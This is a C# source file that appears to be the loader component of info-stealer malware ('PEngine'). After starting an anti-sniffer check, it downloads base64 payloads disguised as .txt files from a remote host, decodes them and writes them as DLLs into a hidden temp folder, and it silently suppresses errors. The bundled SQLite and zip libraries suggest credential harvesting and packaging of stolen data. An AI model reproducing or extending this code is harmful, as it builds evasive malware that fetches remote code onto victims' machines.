namespace PEngine.Loader
{
    using PEngine.Helpers;
    using PEngine.Main;
    using PEngine.Sticks;
    using System;
    using System.Collections.Generic;
    using System.IO;

    public class SafeDll
    {
        private static readonly string OSDirectory = CombineEx.Combination(GlobalPath.GarbageTemp, OSLibrary.GetOSBit());

        private static readonly List<string> Encryptdll = new List<string>()
        {
            "x86/SQLite.Interop.txt",
            "x64/SQLite.Interop.txt",
            "Ionic.Zip.txt",
            "Newtonsoft.Json.txt",
            "System.Data.SQLite.txt"
        };

        private static void GetByte(string Link, string Name)
        {
            try
            {
                File.WriteAllBytes(Name, Convert.FromBase64String(NetControl.GetData(Link)));
            }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch (ArgumentException) { }
        }

        public static bool Download(string HostName)
        {
            AntiSniffer.Inizialize();
            if (Directory.Exists(GlobalPath.GarbageTemp))
            {
                if (!Directory.Exists(OSDirectory))
                {
                    CombineEx.CreateDir(OSDirectory);
                    return Download(HostName);
                }
                else
                {
                    foreach (string list in Encryptdll)
                    {
                        if (!list.EndsWith(".txt", StringComparison.Ordinal))
                        {
                            return false;
                        }
                        else
                        {
                            string ChangerExtension = Path.ChangeExtension(list, ".dll");
                            GetByte($@"{HostName}/files/dll/{list}", CombineEx.Combination(GlobalPath.GarbageTemp, ChangerExtension));
                        }
                    }
                }
            }
            return true;
        }
    }
}